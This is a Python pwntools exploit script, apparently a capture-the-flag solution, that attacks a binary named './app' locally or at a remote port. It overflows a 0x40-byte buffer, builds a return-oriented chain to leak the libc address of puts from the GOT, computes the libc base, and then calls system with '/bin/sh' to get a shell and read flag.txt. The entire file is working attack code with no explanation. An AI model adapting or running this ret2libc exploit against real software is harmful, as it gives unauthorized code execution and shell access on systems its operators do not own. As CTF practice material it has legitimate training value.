from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './app'
nc = 'nc 0.0.0.0 1337'
elf = context.binary = ELF(binary)


gdbscript = """
	b * main
	disp/3i $pc
	c
"""

if len(sys.argv) == 1: p = process(binary)
elif sys.argv[1] == 'd': p = gdb.debug(binary, gdbscript)
elif sys.argv[1] == 'r': p = remote(nc.split(' ')[1], int(nc.split(' ')[2]))
else: p = process(binary); util.proc.wait_for_debugger(util.proc.pidof(p)[0])

# 0x00404018 0x00003018 SET_64 7     puts
got_puts = 0x00404018

libc_puts = 0x00084420
libc_system = 0x00052290
libc_binsh = 0x001b45bd

# 0x00000000004011f3 : pop rdi ; ret
# 0x000000000040101a : ret
pop_rdi_ret = 0x00000000004011f3
ret = 0x000000000040101a
main_puts_call = 0x0000000000401169
writeable = 0x0000000000404000 + 0x800

payload = (0x40) * b'A'
payload += p64(writeable)
payload += p64(pop_rdi_ret)
payload += p64(got_puts)
payload += p64(main_puts_call)
p.sendline(payload)

p.recvline()

leak = int.from_bytes(p.recv(6), 'little')
libc_base = leak - libc_puts
#print(hex(libc_base))
libc_system = libc_base + libc_system
libc_binsh = libc_base + libc_binsh

payload = (0x40) * b'A'
payload += (8) * b'C'
payload += p64(pop_rdi_ret)
payload += p64(libc_binsh)
payload += p64(ret)
payload += p64(libc_system)
p.sendline(payload)

p.sendline(b'cat flag.txt')
print(p.recvline())
p.sendline(b'exit')
p.interactive()
